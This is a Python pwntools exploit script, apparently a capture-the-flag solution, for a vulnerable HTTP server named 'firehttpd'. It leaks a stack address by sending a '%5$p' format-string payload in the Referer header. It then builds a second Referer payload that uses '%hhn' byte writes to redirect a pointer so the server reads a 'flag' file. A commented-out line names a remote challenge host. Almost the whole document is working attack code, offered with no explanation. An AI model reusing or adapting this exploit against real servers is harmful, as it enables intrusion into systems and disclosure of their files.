#!/usr/bin/env python3

import re
import sys
import random
from pwn import *

elf = ELF("./firehttpd")
context.log_level = 'debug'

# leak stack address to write
r = remote("127.0.0.1", 1337)
# r = remote("142.93.113.55", 31084)

payload = "%5$p"
request = (
    "GET / HTTP/1.0\r\n"
    "Referer: " + payload + "\r\n" +
    "\r\n"
)
r.send(request)
data = r.recvall()

leak = int(re.search(b"Referer: (0x[0-9a-f]+)\n", data).group(1), 16)
to_write = leak - 0xb10
flag_addr = leak - 0xaa0

print("Leak: %x" % leak)
print("To write: %x" % to_write)
print("Flag addr: %x" % flag_addr)

# 0xdf40 - 0x16 + 10
#num = (flag_addr & 0xffff) - 0x16 + 12
# num = (flag_addr & 0xff) - 0x16 + 11 

# pause()

def delta(have, want):
    if have == want:
        return 0

    if have < want:
        return want - have
    else:
        return (0x100 | want) - have

# write to address
r = remote("127.0.0.1", 1337)
# r = remote("142.93.113.55", 31084)

byte1 = flag_addr & 0xff


fmt1 = delta(0x1a, byte1) + 10
if random.choice([True, False]):
    fmt1 = fmt1 -1 # HERE

num = (0x25 + fmt1 - 10) % 256
print("NUM " + hex(num))

byte2 = (flag_addr>>8) & 0xff 

fmt2 = delta(num, byte2) + 8 + 2
if random.choice([True, False]):
    fmt2 = fmt2 - 1 # HERE

fmt1_str = b"%20$" + bytes(str(fmt1), "utf-8") + b"x"
fmt2_str = b"%20$" + bytes(str(fmt2), "utf-8") + b"x"

payload = (
    b"A" * 7 +
    fmt1_str + b"B" * (8 - len(fmt1_str)) +
    b"%17$hhn" + b"B" * 1 +
    fmt2_str + b"B" * (8- len(fmt2_str)) +
    b"%18$hhn" + b"B" * 1 +
    p64(to_write) + 
    p64(to_write + 1) +
    b"flag\x00CCC" +
    p64(0x4444444444444444)
)

request = (
    b"GET / HTTP/1.0\r\n"
    b"Referer: " + payload + b"\r\n" +
    b"\r\n"
)
r.send(request)
print(r.recvall())

# r.interactive()
